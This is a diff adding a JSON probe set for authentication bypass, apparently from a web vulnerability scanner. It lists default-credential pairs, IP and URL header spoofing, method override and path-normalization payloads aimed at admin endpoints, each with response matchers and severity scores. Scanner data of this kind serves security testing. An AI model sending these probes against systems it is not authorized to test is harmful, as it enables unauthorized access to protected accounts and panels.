@@ -1,0 +1,114 @@
+{
+  "category": "auth_bypass",
+  "contexts": {
+    "default_credentials": {
+      "description": "Default/common credentials on admin panels",
+      "tech_match": [],
+      "param_match": ["username", "password", "login", "user", "pass"],
+      "probes": [
+        {
+          "payload": "admin:admin",
+          "description": "Default admin:admin credentials",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "not_word", "words": ["invalid", "incorrect", "failed", "wrong"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "admin:password",
+          "description": "Common admin:password credentials",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "not_word", "words": ["invalid", "incorrect", "failed", "wrong"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "header_bypass": {
+      "description": "Authentication bypass via IP/header spoofing",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Forwarded-For: 127.0.0.1 to bypass IP restriction",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["forbidden", "unauthorized", "denied"]}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"header": "X-Forwarded-For: 127.0.0.1"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Original-URL header override (Nginx/IIS bypass)",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["forbidden", "not found"]}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"header": "X-Original-URL: /admin"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Rewrite-URL header override",
+          "matchers": [{"type": "status", "status": [200]}],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {"header": "X-Rewrite-URL: /admin"}
+        }
+      ]
+    },
+    "method_override": {
+      "description": "HTTP method override to bypass auth",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "X-HTTP-Method-Override: PUT to bypass POST-only auth check",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["method not allowed"]}],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"header": "X-HTTP-Method-Override: PUT"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Override via _method=PUT parameter",
+          "matchers": [{"type": "status", "status": [200]}],
+          "severity": "medium",
+          "confidence_boost": 25
+        }
+      ]
+    },
+    "path_normalization": {
+      "description": "Path normalization bypass for restricted endpoints",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/admin/./",
+          "description": "Dot-slash path normalization bypass",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["forbidden", "denied"]}],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "/ADMIN",
+          "description": "Case-sensitivity bypass (uppercase path)",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["not found"]}],
+          "severity": "medium",
+          "confidence_boost": 30
+        },
+        {
+          "payload": "/admin%2f",
+          "description": "URL-encoded trailing slash bypass",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["forbidden"]}],
+          "severity": "medium",
+          "confidence_boost": 30
+        },
+        {
+          "payload": "/;/admin",
+          "description": "Semicolon path bypass (Tomcat/Spring)",
+          "matchers": [{"type": "status", "status": [200]}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    }
+  }
+}
